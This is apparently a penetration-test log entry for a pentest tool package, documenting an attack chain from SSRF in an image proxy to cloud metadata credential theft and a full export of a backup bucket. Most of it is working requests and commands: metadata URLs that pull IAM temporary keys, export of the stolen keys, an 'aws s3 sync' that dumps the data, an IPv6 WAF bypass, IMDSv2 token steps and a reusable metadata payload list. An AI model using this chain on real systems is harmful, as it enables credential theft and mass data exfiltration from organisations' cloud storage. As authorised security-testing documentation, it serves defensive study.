# [2026-02] SSRF → Cloud Metadata → AK/SK → Full OSS Data Dump

## Scenario Category
Web pentest / cloud security

## Target Overview
Through a web application's SSRF vulnerability, access the cloud metadata service, obtain temporary credentials, and finally export the entire OSS bucket's data.

## Complete Execution Chain

1. The image proxy endpoint is found to have SSRF
   ```
   GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK (internal port probe successful)
   ```
2. Try to access cloud metadata
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
   → metadata directory listing returned
   ```
3. Get the IAM role name
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → ECS-Role-WebApp
   ```
4. Get temporary credentials
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
   → AccessKeyId, SecretAccessKey, Token
   ```
5. Use the credentials to enumerate OSS buckets
   ```bash
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws s3 ls  # or aliyun oss ls
   ```
6. Discover the sensitive bucket and export the data
   ```bash
   aws s3 sync s3://company-backup ./backup/
   ```

## Pitfall Log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| SSRF blocked by the WAF for 169.254 | IP blacklist | Bypass with the IPv6 address `[::ffff:169.254.169.254]` | 15min |
| Temporary credentials expire in 1 hour | The STS Token has a short lifetime | Write a script that refreshes the Token automatically | 10min |
| Metadata v2 requires a Token | IMDSv2 protection | First PUT to obtain the Token, then send requests carrying the Token | 20min |

## Toolchain Findings
- Alibaba Cloud and AWS use different metadata paths; try each separately
- IMDSv2 requires a two-step request (PUT to get the token → GET with the token)
- Some cloud providers enable IMDSv2 by default, which increases the SSRF difficulty

## Key Code/Commands

```bash
# IMDSv2 bypass (requires the SSRF to support custom Method and Header)
# Step 1: obtain the Token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: request with the Token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

## Reusable Patterns/Script Snippets

```bash
# SSRF cloud metadata quick-detection payload list
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/metadata/v1/"
  "http://100.100.100.200/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
)
```

## Improvement Suggestions for This Package
- routing.md already has SSRF/cloud security routes ✓
- Suggest adding a cloud-provider metadata path reference table to pentest-tools/references

## Evolution Actions
- [ ] Add the cloud metadata path reference table to references

## Environment Info
- Target: Alibaba Cloud ECS + OSS
- Web framework: Spring Boot 2.7
- SSRF type: fully reflective (Full SSRF)
